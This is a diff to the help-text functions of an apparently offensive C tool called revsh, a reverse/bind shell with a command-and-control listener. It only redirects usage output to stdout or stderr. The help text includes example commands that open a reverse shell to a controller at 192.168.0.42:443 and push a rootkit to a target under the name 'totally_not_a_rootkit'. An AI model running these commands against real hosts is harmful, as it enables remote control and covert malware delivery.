@@ -74,60 +74,73 @@ volatile sig_atomic_t sig_found = 0;
 // -y : Disable default tap.
 
 void usage(int ret_code){
-	fprintf(stderr, "\n");
-	fprintf(stderr, "C2 usage:\t%s -c [-b] [-v] [-h] [-H] [ADDRESS:PORT]\n", program_invocation_short_name);
-	fprintf(stderr, "Target usage:\t%s    [-b] [-v]           [ADDRESS:PORT]\n", program_invocation_short_name);
-	fprintf(stderr, "\n");
-	fprintf(stderr, "\t-c\t\tRun as a command and control listener.\n");
-	fprintf(stderr, "\t-b\t\tBind shell mode. Must be specified on both ends.\n");
-	fprintf(stderr, "\t-v\t\tVerbose error reporting.\n");
-	fprintf(stderr, "\t-h\t\tPrint this short help with common options.\n");
-	fprintf(stderr, "\t-H\t\tPrint a much longer help with all options.\n");
-	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the C2 listener.\t(Default is \"%s\".)\n", ADDRESS);
-	fprintf(stderr, "\n");
+	FILE *out_stream = stdout;
+
+	if(ret_code){
+		out_stream = stderr;
+	}
+
+	fprintf(out_stream, "\n");
+	fprintf(out_stream, "C2 usage:\t%s -c [-b] [-v] [-h] [-H] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "Target usage:\t%s    [-b] [-v]           [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "\n");
+	fprintf(out_stream, "\t-c\t\tRun as a command and control listener.\n");
+	fprintf(out_stream, "\t-b\t\tBind shell mode. Must be specified on both ends.\n");
+	fprintf(out_stream, "\t-v\t\tVerbose error reporting.\n");
+	fprintf(out_stream, "\t-h\t\tPrint this short help with common options.\n");
+	fprintf(out_stream, "\t-H\t\tPrint a much longer help with all options.\n");
+	fprintf(out_stream, "\tADDRESS:PORT\tThe address and port of the C2 listener.\t(Default is \"%s\".)\n", ADDRESS);
+	fprintf(out_stream, "\n");
+
 	exit(ret_code);
 }
 
 void usage_long(int ret_code){
+	FILE *out_stream = stdout;
+
+	if(ret_code){
+		out_stream = stderr;
+	}
+
 #ifdef OPENSSL
-	fprintf(stderr, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-z LOG_FILE] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-z LOG_FILE] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
 #else /* OPENSSL */
-	fprintf(stderr, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2] [-z LOG_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2] [-z LOG_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
 #endif /* OPENSSL */
 
-	fprintf(stderr, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
+	fprintf(out_stream, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
 #ifdef OPENSSL
-	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
-	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
+	fprintf(out_stream, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
+	fprintf(out_stream, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
 #endif /* OPENSSL */
-	fprintf(stderr, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
-	fprintf(stderr, "\t-L\t\tLocal Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
-	fprintf(stderr, "\t-D\t\tDynamic Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
-	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
-	fprintf(stderr, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
-	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
+	fprintf(out_stream, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
+	fprintf(out_stream, "\t-L\t\tLocal Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
+	fprintf(out_stream, "\t-D\t\tDynamic Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
+	fprintf(out_stream, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
+	fprintf(out_stream, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
+	fprintf(out_stream, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
 #ifdef LOG_FILE
-	fprintf(stderr, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(Default is \"%s\".)\n", LOG_FILE);
+	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(Default is \"%s\".)\n", LOG_FILE);
 #else
-	fprintf(stderr, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(No default set.)\n");
+	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(No default set.)\n");
 #endif
-	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
-	fprintf(stderr, "\t-k\t\tRun in keep-alive mode.\n\t\t\tOnly valid in bind shell mode.\n");
-	fprintf(stderr, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
-	fprintf(stderr, "\t-v\t\tVerbose output.\n");
-	fprintf(stderr, "\t-h\t\tPrint this help.\n");
-	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
-	fprintf(stderr, "\n\tNotes:\n");
-	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
-	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
-	fprintf(stderr, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
-	fprintf(stderr, "\n\tInteractive example:\n");
-	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
-	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
-	fprintf(stderr, "\n\tNon-interactive example:\n");
-	fprintf(stderr, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
-	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
-	fprintf(stderr, "\n\n");
+	fprintf(out_stream, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
+	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tOnly valid in bind shell mode.\n");
+	fprintf(out_stream, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
+	fprintf(out_stream, "\t-v\t\tVerbose output.\n");
+	fprintf(out_stream, "\t-h\t\tPrint this help.\n");
+	fprintf(out_stream, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
+	fprintf(out_stream, "\n\tNotes:\n");
+	fprintf(out_stream, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
+	fprintf(out_stream, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
+	fprintf(out_stream, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
+	fprintf(out_stream, "\n\tInteractive example:\n");
+	fprintf(out_stream, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
+	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
+	fprintf(out_stream, "\n\tNon-interactive example:\n");
+	fprintf(out_stream, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
+	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
+	fprintf(out_stream, "\n\n");
 
 	exit(ret_code);
 }
